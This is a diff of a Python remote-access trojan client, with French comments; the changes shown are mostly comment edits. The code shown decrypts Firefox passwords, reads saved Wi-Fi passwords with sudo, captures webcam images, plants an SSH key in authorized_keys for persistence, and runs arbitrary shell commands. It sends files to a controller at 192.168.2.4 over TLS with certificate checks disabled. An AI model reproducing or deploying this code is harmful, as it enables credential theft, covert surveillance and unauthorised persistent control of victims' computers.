@@ -16,8 +16,9 @@ import cv2
 # ========== COMMANDES PERSONNALISÉES ==========
 
 # COMMANDE : firefox
-def resource_path(relative_path):
-    if hasattr(sys, '_MEIPASS'):
+# fonction pour avoir le chemin absolu de firefox_decrypt.py généré par PyInstaller
+def resource_path(relative_path): 
+    if hasattr(sys, '_MEIPASS'): # MEIPASS est un dossier temporaire créer par PyInstaller
         return os.path.join(sys._MEIPASS, relative_path)
     return os.path.abspath(relative_path)
 
@@ -61,7 +62,7 @@ def dump_wifi_credentials(output_file="wifi_credentials.txt"):
     try:
         path = "/etc/NetworkManager/system-connections/"
         if not os.path.isdir(path):
-            return "Répertoire introuvable : NetworkManager non utilisé ?"
+            return "Répertoire introuvable"
 
         creds = []
 
@@ -70,7 +71,7 @@ def dump_wifi_credentials(output_file="wifi_credentials.txt"):
             full_path = os.path.join(path, filename)
 
             try:
-                # Utiliser sudo cat pour obtenir le contenu (nécessite privilèges root)
+                # utilisation en sudo pour voir le contenue
                 result = subprocess.run(["sudo", "cat", full_path],
                                         capture_output=True, text=True)
                 if result.returncode != 0:
@@ -119,14 +120,14 @@ def send_files(file_list, sock):
             filename = os.path.basename(filepath)
             filesize = os.path.getsize(filepath)
 
-            # Envoyer le nom de fichier
+            # envoi le nom de fichier
             sock.send(struct.pack("!I", len(filename)))
             sock.send(filename.encode())
 
-            # Envoyer la taille
+            # envoi la taille
             sock.send(struct.pack("!Q", filesize))  # Q = unsigned long long (8 bytes)
 
-            # Envoyer le contenu
+            # envoi le contenu
             with open(filepath, "rb") as f:
                 while chunk := f.read(4096):
                     sock.sendall(chunk)
@@ -144,7 +145,7 @@ def send_files(file_list, sock):
 # COMMANDE : webcam
 def capture_webcam(filename="webcam.jpg"):
     try:
-        cam = cv2.VideoCapture(0)  # 0 = webcam par défaut
+        cam = cv2.VideoCapture(0)  # webcam par défaut = 0 
         if not cam.isOpened():
             return("Impossible d'accéder à la webcam.")
             
@@ -232,20 +233,20 @@ def generate_ssh_keypair(passphrase="test",
         authorized_keys_path = os.path.expanduser("~/.ssh/authorized_keys")
         ssh_dir = os.path.expanduser("~/.ssh")
         
-        # Générer la paire de clés
+        # générer la paire de clés
         private_key = paramiko.RSAKey.generate(2048)
         private_key.write_private_key_file(private_key_path, password=passphrase)
         public_key = private_key.get_name() + " " + private_key.get_base64()
 
-        # Sauvegarder la clé publique
+        # sauvegarde la clé publique
         with open(public_key_path, "w") as public_key_file:
             public_key_file.write(public_key)
 
-        # Créer le dossier .ssh s'il n'existe pas
+        # créer le dossier .ssh s'il n'existe pas
         if not os.path.exists(ssh_dir):
             os.makedirs(ssh_dir, mode=0o700)
 
-        # Ajouter la clé dans authorized_keys si elle n'y est pas déjà
+        # ajouter la clé dans authorized_keys si elle n'y est pas déjà
         if not os.path.exists(authorized_keys_path):
             open(authorized_keys_path, "w").close()
             os.chmod(authorized_keys_path, 0o600)
@@ -272,6 +273,7 @@ def exec_cmd(cmd):
 
 
 # ========== HANDLE ==========
+
 def get_ip():
     try:
         return subprocess.check_output("hostname -I", shell=True).decode().strip()
@@ -304,14 +306,12 @@ def handle_command(cmd):
         return exec_cmd(cmd)
 
 
-
-
 # ========== CLIENT MAIN ==========
 
 HOST = "192.168.2.4"
 PORT = 12345
 
-#création du socket client
+# création du socket client avec du ssl
 context = ssl.create_default_context()
 context.check_hostname = False
 context.verify_mode = ssl.CERT_NONE
@@ -322,7 +322,7 @@ client_socket = context.wrap_socket(sock, server_hostname=HOST)
 print(f"Connecté au serveur {HOST}:{PORT}")
 
 
-#échange des messages
+# échange des messages
 try:
     while True:
         command = client_socket.recv(4096).decode().strip().lower()
